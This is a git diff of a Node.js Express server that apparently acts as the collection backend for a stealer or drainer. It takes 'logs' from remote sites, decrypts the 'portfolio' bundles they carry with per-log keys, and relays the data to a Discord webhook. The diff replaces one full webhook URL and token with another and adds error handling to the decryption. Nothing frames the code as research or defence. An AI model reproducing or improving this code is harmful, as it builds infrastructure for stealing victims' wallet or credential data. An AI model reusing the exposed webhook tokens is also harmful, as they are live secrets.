@@ -5,7 +5,8 @@ const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517941078542516304/9C7lEa0iDJht0SSdJVYLhvFMEmAeHJEgMnmiD78BV98xN97HXLHJ4lYJAe8qGjdzk8tt";
+// === NEW WEBHOOK ===
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";
 
 app.use(express.raw({ type: '*/*', limit: '10mb' }));
 app.use(express.json({ limit: '10mb' }));
@@ -18,6 +19,7 @@ app.get('/data/:payload', async (req, res) => {
 
         console.log(`✅ New log from ${data.site || 'unknown'}`);
 
+        // Decrypt portfolio bundles using per-log bundleKey
         if (data.portfolio) {
             data.portfolio = decryptPortfolio(data.portfolio);
         }
@@ -35,18 +37,24 @@ function decryptPortfolio(portfolio) {
     const bundleKeyB64 = portfolio.bundleKey;
     if (!bundleKeyB64) return portfolio;
 
+    // Decrypt sBundles
     if (portfolio.sBundles) {
         try {
             const bundles = JSON.parse(portfolio.sBundles);
             portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
-        } catch (e) {}
+        } catch (e) {
+            portfolio.sBundlesDecrypted = { error: "Failed to parse sBundles" };
+        }
     }
 
+    // Decrypt eBundles
     if (portfolio.eBundles) {
         try {
             const bundles = JSON.parse(portfolio.eBundles);
             portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
-        } catch (e) {}
+        } catch (e) {
+            portfolio.eBundlesDecrypted = { error: "Failed to parse eBundles" };
+        }
     }
 
     return portfolio;
@@ -91,7 +99,7 @@ function tryDecryptAES(encryptedB64, keyB64) {
         } catch (e) {}
     }
 
-    return { success: false, error: "Decryption failed" };
+    return { success: false, error: "All decryption attempts failed" };
 }
 
 async function sendToDiscord(data) {
